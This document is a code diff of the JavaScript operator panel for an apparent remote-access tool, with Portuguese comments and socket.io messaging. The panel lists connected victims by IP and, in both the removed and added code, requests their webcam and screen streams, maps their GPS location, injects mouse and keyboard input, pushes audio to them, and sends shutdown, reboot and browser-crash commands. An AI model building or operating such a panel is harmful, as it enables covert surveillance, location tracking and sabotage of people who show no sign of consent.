-  img.onwheel = e=>{
-    socket.emit('mouse-event', {uuid, ev:{type:'scroll', dy:e.deltaY>0? -1:1}});
-  };
-
-  /* ---- teclado ---- */
-  document.addEventListener('keydown',  keyEvt);
-  document.addEventListener('keyup',    keyEvt);
-
-  function keyEvt(e){
-    // tecla simples (ignora Ctrl + ... por segurança)
-    if (e.ctrlKey || e.metaKey) return;
-    const action = e.type === 'keydown' ? 'press' : 'release';
-    socket.emit('key-event', {uuid, ev:{action, key:e.key}});
-    e.preventDefault();
-  }
-
-  /* ---- sair do modo ---- */
-  function cleanup(){
-    img.onmousemove = img.onclick = img.oncontextmenu = img.onwheel = null;
-    document.removeEventListener('keydown', keyEvt);
-    document.removeEventListener('keyup',   keyEvt);
-    img.style.cursor='default';
-  }
-  // sai quando fecha full‑screen
-  document.addEventListener('fullscreenchange', () => {
-    if (!document.fullscreenElement) cleanup();
-  }, { once:true });
+// Toast helper
+function toast(msg,type='') {
+  const el = document.createElement('div');
+  el.className = 'toast';
+  el.textContent = msg;
+  document.getElementById('toastContainer').appendChild(el);
+  setTimeout(() => el.remove(), 2400);
 }
 
+// List clients
+socket.on('clients', arr => {
+  document.getElementById('count').textContent = arr.length;
+  listEl.innerHTML = '';
+  arr.forEach(c=> {
+    cache[c.uuid] = c;
+    const div = document.createElement('div');
+    div.className = 'client';
+    div.textContent = c.ip;
+    div.dataset.uuid = c.uuid;
+    listEl.appendChild(div);
+  });
+});
 
-    card.querySelector('.btn-full').onclick=()=>openFull(card);
-    card.querySelector('.btn-min').onclick=()=>{ if(document.fullscreenElement===card) document.exitFullscreen(); };
-    card.querySelector('.btn-stop').onclick=()=>{ socket.emit(kind==='cam'?'stop-stream':'stop-screen',uuid); card.remove(); };
-    $('viewer').appendChild(card);
-  };
+// Click client
+listEl.addEventListener('click', e => {
+  const d = e.target.dataset;
+  if (!d.uuid) return;
+  currentUUID = d.uuid;
+  document.getElementById('actionMenu').style.display = 'flex';
+});
 
-  
-  
-  const startStream = kind=>{
-    if(kind==='cam'   && activeCam[currentUUID])     {toast('Câmera já ativa','secondary');return;}
-    if(kind==='screen'&& activeScreen[currentUUID])  {toast('Tela já ativa','secondary');return;}
-    socket.emit(kind==='cam'?'request-stream':'request-screen',currentUUID);
-    (kind==='cam'?activeCam:activeScreen)[currentUUID]=true;
-    mkCard(currentUUID,kind);
-    toast(`${kind==='cam'?'Câmera':'Tela'} ativada`);
-  };
-  const stopStream = kind=>{
-    socket.emit(kind==='cam'?'stop-stream':'stop-screen',currentUUID);
-    (kind==='cam'?activeCam:activeScreen)[currentUUID]=false;
-    $(`${kind==='cam'?'cam':'screen'}-${currentUUID}`)?.remove();
-    toast(`${kind==='cam'?'Câmera':'Tela'} parada`,'secondary');
-  };
-  const openFull = card=>{
-    const img=card.querySelector('img');
-    const onFs=()=>{
-      if(document.fullscreenElement===card){
-        img.style.objectFit='contain'; img.style.height='100vh';
-      }else{
-        img.style.objectFit='cover'; img.style.height='200px';
-        document.removeEventListener('fullscreenchange',onFs);
-      }
-    };
-    document.addEventListener('fullscreenchange',onFs);
-    (card.requestFullscreen||card.webkitRequestFullscreen||card.msRequestFullscreen).call(card);
-  };
-
-  /* ===== Crash ===== */
-  $('confirmCrash').onclick=()=>{
-    bootstrap.Modal.getInstance('#crashModal').hide();
-    socket.emit('crash-browser',currentUUID);
-    toast('Enviando crash…','danger');
-  };
-
-  /* ===== Infos + mapa ===== */
-  let map,marker;
-  function showInfo(){
-    const c=cache[currentUUID];
-    $('infoIp').textContent=c.ip||'-';
-    $('infoUuid').textContent=c.uuid;
-    if(c.location) updateInfoFields(c.location); else
-      ['infoLat','infoLon','infoAcc','infoTime'].forEach(id=>$(id).textContent='-');
-    bootstrap.Modal.getOrCreateInstance('#infoModal').show();
-    setTimeout(initMap,200);
+// Action menu
+document.getElementById('menuGrid').addEventListener('click', e => {
+  const act = e.target.dataset.act;
+  document.getElementById('actionMenu').style.display = 'none';
+  if (!act) return;
+  const uuid = currentUUID;
+  switch(act) {
+    case 'cam': socket.emit('request-stream',uuid); addCard(uuid,'cam'); break;
+    case 'screen': socket.emit('request-screen',uuid); addCard(uuid,'screen'); break;
+    case 'stop-cam': socket.emit('stop-stream',uuid); removeCard(uuid,'cam'); break;
+    case 'stop-screen': socket.emit('stop-screen',uuid); removeCard(uuid,'screen'); break;
+    case 'info': showInfo(cache[uuid]); break;
+    case 'hwinfo': socket.emit('request-hwinfo',uuid); toast('HW info requisitada'); break;
+    case 'shutdown': socket.emit('shutdown',uuid); toast('Shutdown enviada'); break;
+    case 'reboot': socket.emit('reboot',uuid); toast('Reboot enviada'); break;
+    case 'crash': socket.emit('crash-browser',uuid); toast('Crash enviada','danger'); break;
   }
-  function initMap(){
-    if(map) return;
-    map=L.map('infoMap',{zoomControl:false}).setView([0,0],2);
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{attribution:'© OpenStreetMap'}).addTo(map);
-    marker=L.marker([0,0]).addTo(map);
-    if(cache[currentUUID].location) updateInfoFields(cache[currentUUID].location);
-  }
-  function updateInfoFields(loc){
-    $('infoLat').textContent=loc.lat.toFixed(5);
-    $('infoLon').textContent=loc.lon.toFixed(5);
-    $('infoAcc').textContent=Math.round(loc.accuracy);
-    $('infoTime').textContent=new Date(loc.timestamp).toLocaleTimeString();
-    if(map){
-      map.setView([loc.lat,loc.lon],14);
-      marker.setLatLng([loc.lat,loc.lon]).bindPopup(`Precisão ≈ ${Math.round(loc.accuracy)} m`).openPopup();
-    }
-  }
+});
 
-  /* ===== Gravação de áudio ===== */
-  let mediaRecorder,chunks=[];
-  $('recordBtn').onclick=async()=>{
-    const stream=await navigator.mediaDevices.getUserMedia({audio:true});
-    mediaRecorder=new MediaRecorder(stream); chunks=[];
-    mediaRecorder.ondataavailable=e=>chunks.push(e.data);
-    mediaRecorder.onstop=()=>{
-      const delay=Math.max(0,parseInt(prompt('Atraso (segundos):','0'))||0);
-      const blob=new Blob(chunks,{type:'audio/webm'}); const fr=new FileReader();
-      fr.onload=()=>socket.emit('custom-audio',{uuid:currentUUID,dataURL:fr.result,delay});
-      fr.readAsDataURL(blob);
-    };
-    mediaRecorder.start();
-    $('recordBtn').classList.add('d-none'); $('stopBtn').classList.remove('d-none');
-  };
-  $('stopBtn').onclick=()=>{
-    mediaRecorder.stop();
-    $('recordBtn').classList.remove('d-none'); $('stopBtn').classList.add('d-none');
-    bootstrap.Modal.getInstance('#recordModal').hide();
-  };
+// Receive hwinfo
+socket.on('hwinfo-update', ({uuid,info}) => {
+  showInfo(info);
+});
 
-  
+// Add/Remove card
+function addCard(uuid, kind) {
+  const id = kind+'-'+uuid;
+  if (document.getElementById(id)) return;
+  const c = cache[uuid];
+  const card = document.createElement('div');
+  card.className = 'card';
+  card.id = id;
+  card.innerHTML = `
+    <div class="info">${c.ip} • ${kind}</div>
+    <img id="img-${id}">
+    <div class="btn-bar">
+      <button class="btn" data-stop="${kind}">✖</button>
+    </div>`;
+  viewer.appendChild(card);
+}
 
-  /* ===== Upload áudio local ===== */
-  $('audioFile').onchange=e=>{
-    const f=e.target.files[0]; if(!f) return;
-    const fr=new FileReader();
-    fr.onload=()=>{ readyAudios.push({name:f.name,url:fr.result}); toast('Áudio salvo – use "Enviar áudio"'); };
-    fr.readAsDataURL(f); e.target.value='';
-  };
+// Remove card
+function removeCard(uuid, kind) {
+  const el = document.getElementById(kind+'-'+uuid);
+  if (el) el.remove();
+}
 
-  /* ===== Link do modal de updates ===== */
-  $('updatesLinkBtn').onclick=()=>window.open('https://saporraesukita.netlify.app','_blank');
+// Update frames
+socket.on('frame', d => {
+  const el = document.getElementById('img-cam-'+d.id);
+  if (el) el.src = d.data;
+});
+socket.on('screen-frame', d => {
+  const el = document.getElementById('img-screen-'+d.id);
+  if (el) el.src = d.data;
+});
 
+// Button stop
+viewer.addEventListener('click', e => {
+  const stop = e.target.dataset.stop;
+  if (!stop) return;
+  const uuid = e.target.closest('.card').id.split('-')[1];
+  socket.emit(stop==='cam'?'stop-stream':'stop-screen',uuid);
+  e.target.closest('.card').remove();
+});
 
-
-  
-  </script>
+// Show info modal
+function showInfo(info) {
+  document.getElementById('infoPre').textContent = JSON.stringify(info, null, 2);
+  document.getElementById('infoModal').style.display = 'block';
+}
+function closeModal(id) {
+  document.getElementById(id).style.display = 'none';
+}
+</script>
 </body>
 </html>
